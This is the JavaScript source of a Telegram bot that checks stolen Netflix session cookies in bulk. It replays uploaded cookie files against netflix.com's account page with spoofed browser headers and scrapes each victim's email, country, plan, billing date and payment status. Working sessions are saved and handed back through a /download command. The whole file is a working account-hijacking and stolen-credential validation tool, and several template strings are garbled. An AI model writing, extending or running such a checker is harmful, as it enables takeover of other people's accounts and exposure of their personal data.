const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const https = require('https');
const AdmZip = require('adm-zip');
require('dotenv').config();

const token = process.env.BOT_TOKEN;
if (!token) {
  console.error('❌ BOT_TOKEN not found in environment variables!');
  process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });

let stats = {
  total: 0,
  live: 0,
  dead: 0,
  bad: 0,
  unknown: 0,
  plans: {}
};

const resultsDir = path.join(process.cwd(), 'results');
const fullDir = path.join(resultsDir, 'full');
const cookiesDir = path.join(resultsDir, 'cookies');

if (!fs.existsSync(resultsDir)) fs.mkdirSync(resultsDir, { recursive: true });
if (!fs.existsSync(fullDir)) fs.mkdirSync(fullDir, { recursive: true });
if (!fs.existsSync(cookiesDir)) fs.mkdirSync(cookiesDir, { recursive: true });

const MAX_CONCURRENT = 8;
let activeChecks = 0;

function capitalizePlan(planStr) {
  if (!planStr) return 'Unknown';
  return planStr.charAt(0).toUpperCase() + planStr.slice(1).toLowerCase();
}

function parseCookies(filePath) {
  try {
    const content = fs.readFileSync(filePath, 'utf-8');
    const lines = content.split(/\r?\n/);
    let cookiesArray = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) continue;
      const parts = trimmed.split(/\s+/);
      if (parts.length >= 7) {
        const name = parts[5];
        const value = parts[6];
        cookiesArray.push(`\( {name}= \){value}`);
      } else if (trimmed.includes('=')) {
        cookiesArray.push(trimmed);
      }
    }
    return cookiesArray.join('; ');
  } catch (e) {
    return '';
  }
}

function checkNetflix(cookieString, fileName) {
  return new Promise((resolve) => {
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'Cookie': cookieString.trim()
    };

    const options = {
      hostname: 'www.netflix.com',
      port: 443,
      path: '/account',
      method: 'GET',
      headers: headers
    };

    const req = https.request(options, (res) => {
      if (res.headers.location && (res.headers.location.includes('/login') || res.headers.location.includes('/clearcookies'))) {
        return resolve({ status: 'DEAD', file: fileName });
      }

      let html = '';
      res.on('data', (chunk) => html += chunk);
      res.on('end', () => {
        const emailMatch = html.match(/"emailAddress":"([^"]+)"/) || html.match(/"email":\s*"([^"]+)"/) || html.match(/"userEmail":\s*"([^"]+)"/) || html.match(/data-uia="account-email">([^<]+)</);
        const email = emailMatch ? emailMatch[1].replace(/\\x40/g, '@') : '';

        const emailVerified = html.includes('"isEmailVerified":true') || html.includes('"emailVerified":true') || html.includes('Đã xác minh') ? 'true' : 'false';

        const countryMatch = html.match(/"currentCountry":"([^"]+)"/) || html.match(/"countryOfSignup":"([^"]+)"/) || html.match(/"country":\s*"([^"]+)"/) || html.match(/"countryOfOrigin":\s*"([^"]+)"/);
        const country = countryMatch ? countryMatch[1] : '';

        const billingMatch = html.match(/"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}/) || html.match(/Next billing date:\s*([^<]+)<\/p>/i) || html.match(/data-uia="next-billing-date"[^>]*>([^<]+)<\/p>/i) || html.match(/"nextBillingDate":\s*"([^"]+)"/);
        const nextBilling = billingMatch ? billingMatch[1].replace(/\\x20/g, ' ').trim() : '';

        if (!email || !country || !nextBilling) {
          return resolve({ status: 'BAD', file: fileName });
        }

        const planMatch = html.match(/data-uia="plan-name"[^>]*>([^<]+)<\/h3>/i) || html.match(/data-uia="plan-label"[^>]*>([^<]+)<\/h3>/i) || html.match(/"localizedPlanName":\s*"([^"]+)"/) || html.match(/"planName":\s*"([^"]+)"/);
        let plan = planMatch ? planMatch[1].replace('Gói ', '') : 'Unknown';
        plan = capitalizePlan(plan);

        let payments = "0";
        if (html.match(/"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}/) || html.includes('paymentMethod') || html.includes('data-uia="payment-method"')) {
          payments = '1';
        }

        let extraMembers = 'Unknown';
        const profilesJsonMatch = html.match(/\\"profiles\\":\[(.*?)\]/);
        if (profilesJsonMatch) {
          extraMembers = (profilesJsonMatch[1].match(/\{"summary"/g) || []).length.toString();
        } else {
          const profilesTextMatch = html.match(/(\d+)\s*profiles?/i) || html.match(/"extraMemberCount":(\d+)/i);
          if (profilesTextMatch) extraMembers = profilesTextMatch[1];
        }

        resolve({
          status: 'LIVE',
          file: fileName,
          cookieString,
          email,
          country,
          nextBilling,
          plan,
          payments,
          extraMembers,
          emailVerified
        });
      });
    });

    req.on('error', () => resolve({ status: 'UNKNOWN', file: fileName }));
    req.end();
  });
}

async function handleLocalFile(chatId, localPath, displayName) {
  if (activeChecks >= MAX_CONCURRENT) {
    await new Promise(r => setTimeout(r, 500));
    return handleLocalFile(chatId, localPath, displayName);
  }

  activeChecks++;

  try {
    const cookieString = parseCookies(localPath);
    if (!cookieString) {
      bot.sendMessage(chatId, `❌ BAD | ${displayName} (no valid cookies)`);
      stats.bad++;
      return;
    }

    bot.sendMessage(chatId, `🔍 Checking <b>${displayName}</b>...`, { parse_mode: 'HTML' });

    const result = await checkNetflix(cookieString, displayName);

    stats.total++;

    if (result.status === 'LIVE') {
      stats.live++;
      stats.plans[result.plan] = (stats.plans[result.plan] || 0) + 1;

      const liveText = `✅ <b>LIVE ACCOUNT</b>\n\n` +
        `📧 Email: <code>${result.email}</code>\n` +
        `📍 Country: <b>${result.country.toUpperCase()}</b>\n` +
        `📦 Plan: <b>${result.plan}</b>\n` +
        `📅 Next Billing: <b>${result.nextBilling}</b>\n` +
        `💳 Payments: <b>${result.payments}</b>\n` +
        `👥 Profiles: <b>${result.extraMembers}</b>\n` +
        `✅ Email Verified: <b>${result.emailVerified}</b>\n` +
        `📂 File: ${result.file}`;

      bot.sendMessage(chatId, liveText, { parse_mode: 'HTML' });

      const cleanEmail = result.email.replace(/[/\\?%*:|"<>]/g, '-');
      const savePath = path.join(fullDir, `[${cleanEmail}] ${result.plan}.txt`);
      const fullContent = `Cookie: ${result.cookieString}\n\n======================================\nEmail: ${result.email}\nCountry: ${result.country.toUpperCase()}\nPlan: ${result.plan}\nNext Billing: ${result.nextBilling}\nPayments: ${result.payments}\nProfiles: ${result.extraMembers}\nEmail Verified: ${result.emailVerified}\n======================================\n`;
      fs.writeFileSync(savePath, fullContent, 'utf-8');
      fs.appendFileSync(path.join(cookiesDir, 'cookies.txt'), `Cookie: ${result.cookieString}\n`, 'utf-8');

    } else if (result.status === 'DEAD') {
      stats.dead++;
      bot.sendMessage(chatId, `❌ DEAD | ${displayName}`);
    } else if (result.status === 'BAD') {
      stats.bad++;
      bot.sendMessage(chatId, `❌ BAD | ${displayName}`);
    } else {
      stats.unknown++;
      bot.sendMessage(chatId, `⚠️ UNKNOWN | ${displayName}`);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Error processing ${displayName}`);
  } finally {
    activeChecks--;
  }
}

async function processTelegramFile(chatId, fileId, fileName) {
  const tempDir = path.join(process.cwd(), 'temp');
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
  const tempPath = path.join(tempDir, `\( {Date.now()}- \){fileName}`);

  try {
    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot\( {token}/ \){file.file_path}`;

    await new Promise((resolve, reject) => {
      const fileStream = fs.createWriteStream(tempPath);
      https.get(fileLink, (res) => res.pipe(fileStream).on('finish', resolve)).on('error', reject);
    });

    const lowerName = fileName.toLowerCase();

    if (lowerName.endsWith('.txt')) {
      await handleLocalFile(chatId, tempPath, fileName);
    } else if (lowerName.endsWith('.zip')) {
      bot.sendMessage(chatId, `📦 Extracting ZIP: <b>${fileName}</b>...`, { parse_mode: 'HTML' });
      const zip = new AdmZip(tempPath);
      const entries = zip.getEntries();
      const txtEntries = entries.filter(entry => !entry.isDirectory && entry.entryName.toLowerCase().endsWith('.txt'));

      bot.sendMessage(chatId, `🔍 Found <b>${txtEntries.length}</b> .txt files. Starting...`, { parse_mode: 'HTML' });

      for (const entry of txtEntries) {
        const txtName = path.basename(entry.entryName);
        const tempTxtPath = path.join(tempDir, `\( {Date.now()}- \){txtName}`);
        fs.writeFileSync(tempTxtPath, zip.readFile(entry));
        await handleLocalFile(chatId, tempTxtPath, txtName);
        if (fs.existsSync(tempTxtPath)) fs.unlinkSync(tempTxtPath);
      }
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Error processing ${fileName}`);
  } finally {
    if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
  }
}

// Commands
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id,
    `🎬 <b>Netflix Cookie Checker Bot</b>\n\n` +
    `Send <b>.txt</b> (single) or <b>.zip</b> (multiple files) containing Netflix cookies.\n\n` +
    `Commands: /stats /download /clear`, { parse_mode: 'HTML' });
});

bot.onText(/\/stats/, (msg) => {
  let text = `📊 <b>Stats</b>\nTotal: <b>\( {stats.total}</b>\n✅ Live: <b> \){stats.live}</b>\n❌ Bad: <b>\( {stats.dead + stats.bad}</b>\n⚠️ Unknown: <b> \){stats.unknown}</b>`;
  if (Object.keys(stats.plans).length) {
    text += `\n\n📦 Plans:\n`;
    for (const [p, c] of Object.entries(stats.plans)) text += `• ${p}: ${c}\n`;
  }
  bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML' });
});

bot.onText(/\/download/, async (msg) => {
  const f = path.join(cookiesDir, 'cookies.txt');
  if (fs.existsSync(f) && fs.statSync(f).size > 0) {
    await bot.sendDocument(msg.chat.id, f, { caption: `Live cookies - ${new Date().toLocaleString()}` });
  } else bot.sendMessage(msg.chat.id, 'No live cookies yet.');
});

bot.onText(/\/clear/, (msg) => {
  stats = { total: 0, live: 0, dead: 0, bad: 0, unknown: 0, plans: {} };
  bot.sendMessage(msg.chat.id, '✅ Stats reset.');
});

bot.on('message', async (msg) => {
  if (!msg.document) return;
  const doc = msg.document;
  const n = doc.file_name.toLowerCase();
  if (!n.endsWith('.txt') && !n.endsWith('.zip')) {
    return bot.sendMessage(msg.chat.id, '❌ Only .txt or .zip allowed.');
  }
  await processTelegramFile(msg.chat.id, doc.file_id, doc.file_name);
});

console.log('✅ Bot is running... Send .txt or .zip files');
